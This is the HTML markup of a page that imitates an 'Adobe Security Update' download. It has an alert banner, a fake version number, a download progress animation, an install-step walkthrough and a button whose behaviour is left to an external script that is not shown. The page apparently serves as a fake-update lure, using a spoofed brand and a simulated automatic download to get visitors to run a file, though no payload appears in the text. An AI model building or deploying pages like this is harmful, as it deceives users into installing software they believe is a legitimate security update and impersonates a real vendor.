<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adobe Security Update</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Barlow:wght@400;600;700;800&family=Barlow+Condensed:wght@600;700&display=swap');
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:'Barlow',sans-serif;background:#fff;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;-webkit-user-select:none;user-select:none;}
  .header{width:100%;background:#cc0000;padding:14px 40px;display:flex;align-items:center;gap:14px;box-shadow:0 2px 10px rgba(180,0,0,0.3);}
  .header-logo{width:44px;height:44px;border-radius:8px;overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center;}
  .header-logo img{width:44px;height:44px;object-fit:contain;}
  .header-title{font-family:'Barlow Condensed',sans-serif;font-size:24px;font-weight:700;letter-spacing:1px;color:#fff;}
  .header-title span{color:#ffcccc;}
  .lang-bar{width:100%;background:#1a1a1a;padding:7px 40px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;}
  .lang-bar span{color:#888;font-size:12px;margin-right:4px;}
  .lang-btn{background:none;border:1px solid #555;color:#ccc;font-size:12px;padding:3px 10px;border-radius:20px;cursor:pointer;transition:all 0.2s;}
  .lang-btn:hover,.lang-btn.active{background:#cc0000;border-color:#cc0000;color:#fff;}
  .container{width:100%;max-width:780px;padding:40px 20px 60px;}
  .alert-banner{background:linear-gradient(135deg,#cc0000,#990000);border-radius:10px;padding:22px 26px;margin-bottom:30px;display:flex;align-items:flex-start;gap:16px;box-shadow:0 4px 20px rgba(180,0,0,0.25);}
  .alert-icon{font-size:32px;flex-shrink:0;margin-top:2px;}
  .alert-text h2{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:700;color:#fff;margin-bottom:6px;}
  .alert-text p{font-size:14px;color:#ffcccc;line-height:1.6;}
  .version-badge{display:inline-block;background:#fff;color:#cc0000;font-size:12px;font-weight:800;padding:3px 10px;border-radius:20px;margin-left:8px;vertical-align:middle;}
  .download-box{background:#fff5f5;border:2px solid #ffcccc;border-radius:12px;padding:32px 28px;margin-bottom:30px;text-align:center;}
  .download-box h3{font-size:17px;color:#990000;margin-bottom:6px;font-weight:700;}
  .download-box p{font-size:13px;color:#aa6666;margin-bottom:24px;}
  .circle-wrap{display:flex;justify-content:center;margin-bottom:18px;}
  .circle-container{position:relative;width:90px;height:90px;}
  .circle-container svg{transform:rotate(-90deg);}
  .circle-bg{fill:none;stroke:#ffcccc;stroke-width:7;}
  .circle-progress{fill:none;stroke:#cc0000;stroke-width:7;stroke-linecap:round;stroke-dasharray:251.2;stroke-dashoffset:251.2;transition:stroke-dashoffset 2.2s cubic-bezier(.4,0,.2,1),stroke 0.4s;}
  .circle-icon{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px;}
  .status-msg{font-size:15px;font-weight:700;color:#990000;margin-bottom:18px;min-height:24px;}
  .status-msg.success{color:#22aa44;}
  .btn-download{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#cc0000,#990000);color:white;font-family:'Barlow',sans-serif;font-size:17px;font-weight:700;padding:15px 40px;border-radius:8px;text-decoration:none;box-shadow:0 4px 20px rgba(180,0,0,0.35);transition:all 0.3s;border:none;cursor:pointer;}
  .btn-download:hover{transform:translateY(-2px);}
  .btn-download.hidden{display:none;}
  .btn-download.green-btn{background:linear-gradient(135deg,#22aa44,#177733);box-shadow:0 4px 20px rgba(34,170,68,0.4);}
  .auto-msg{margin-top:14px;font-size:12px;color:#cc6666;}
  .steps-title{font-family:'Barlow Condensed',sans-serif;font-size:24px;font-weight:700;color:#cc0000;margin-bottom:20px;padding-bottom:10px;border-bottom:2px solid #ffcccc;}
  .step{background:#fff;border:1px solid #ffcccc;border-left:4px solid #cc0000;border-radius:10px;padding:22px 24px;margin-bottom:16px;display:flex;gap:18px;align-items:flex-start;box-shadow:0 2px 8px rgba(180,0,0,0.06);}
  .step-num{background:linear-gradient(135deg,#cc0000,#990000);color:white;font-weight:800;font-size:16px;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;}
  .step-content h4{font-size:16px;font-weight:700;color:#1a1a1a;margin-bottom:6px;}
  .step-content p{font-size:14px;color:#555;line-height:1.7;}
  .step-content strong{color:#cc0000;}
  .step-image{width:100%;margin-top:14px;border:1px solid #ffcccc;border-radius:8px;overflow:hidden;}
  .step-image img{width:100%;display:block;}
  .warning-box{background:#fff5f5;border:1px solid #ffaaaa;border-left:4px solid #cc0000;border-radius:10px;padding:18px 22px;margin-top:24px;display:flex;gap:14px;align-items:flex-start;}
  .warning-box .w-icon{font-size:22px;flex-shrink:0;}
  .warning-box p{font-size:13px;color:#880000;line-height:1.6;}
  .footer{width:100%;background:#cc0000;padding:20px 40px;text-align:center;font-size:12px;color:#ffcccc;margin-top:auto;}
</style>
</head>
<body>
<div class="header">
  <div class="header-logo"><img src="logo.png" alt="Logo"></div>
  <div class="header-title">Ado<span>be</span></div>
</div>
<div class="lang-bar">
  <span>&#127760;</span>
  <button class="lang-btn active" id="btn-en" onclick="applyLang('en')">English</button>
  <button class="lang-btn" id="btn-zh" onclick="applyLang('zh')">&#20013;&#25991;</button>
  <button class="lang-btn" id="btn-ar" onclick="applyLang('ar')">&#1593;&#1585;&#1576;&#1610;</button>
  <button class="lang-btn" id="btn-fr" onclick="applyLang('fr')">Fran&ccedil;ais</button>
  <button class="lang-btn" id="btn-es" onclick="applyLang('es')">Espa&ntilde;ol</button>
  <button class="lang-btn" id="btn-de" onclick="applyLang('de')">Deutsch</button>
  <button class="lang-btn" id="btn-it" onclick="applyLang('it')">Italiano</button>
</div>
<div class="container">
  <div class="alert-banner">
    <div class="alert-icon">&#128274;</div>
    <div class="alert-text">
      <h2 id="t-title">Adobe Security Update <span class="version-badge">v15.008.20082</span></h2>
      <p id="t-desc"></p>
    </div>
  </div>
  <div class="download-box">
    <h3 id="t-preparing"></h3>
    <p id="t-wait"></p>
    <div class="circle-wrap">
      <div class="circle-container">
        <svg width="90" height="90" viewBox="0 0 90 90">
          <circle class="circle-bg" cx="45" cy="45" r="40"/>
          <circle class="circle-progress" id="progressCircle" cx="45" cy="45" r="40"/>
        </svg>
        <div class="circle-icon" id="circleIcon">&#11015;</div>
      </div>
    </div>
    <div class="status-msg" id="statusMsg"></div>
    <!-- Button — no href, onclick handled by lang.js opens new tab -->
    <button class="btn-download hidden" id="manualBtn"></button>
    <div class="auto-msg" id="t-fileinfo"></div>
  </div>
  <div class="steps-title" id="t-steptitle"></div>
  <div class="step"><div class="step-num">1</div><div class="step-content"><h4 id="t-s1h"></h4><p id="t-s1p"></p><div class="step-image"><img src="imagestep111.png" alt="Step 1"></div></div></div>
  <div class="step"><div class="step-num">2</div><div class="step-content"><h4 id="t-s2h"></h4><p id="t-s2p"></p><div class="step-image"><img src="imagestep222.png" alt="Step 2"></div></div></div>
  <div class="step"><div class="step-num">3</div><div class="step-content"><h4 id="t-s3h"></h4><p id="t-s3p"></p><div class="step-image"><img src="imagestep333.png" alt="Step 3"></div></div></div>
  <div class="step"><div class="step-num">4</div><div class="step-content"><h4 id="t-s4h"></h4><p id="t-s4p"></p></div></div>
  <div class="warning-box"><div class="w-icon">&#9888;</div><p id="t-warn"></p></div>
</div>
<div class="footer" id="t-footer"></div>
<script src="lang.js"></script>
</body>
</html>
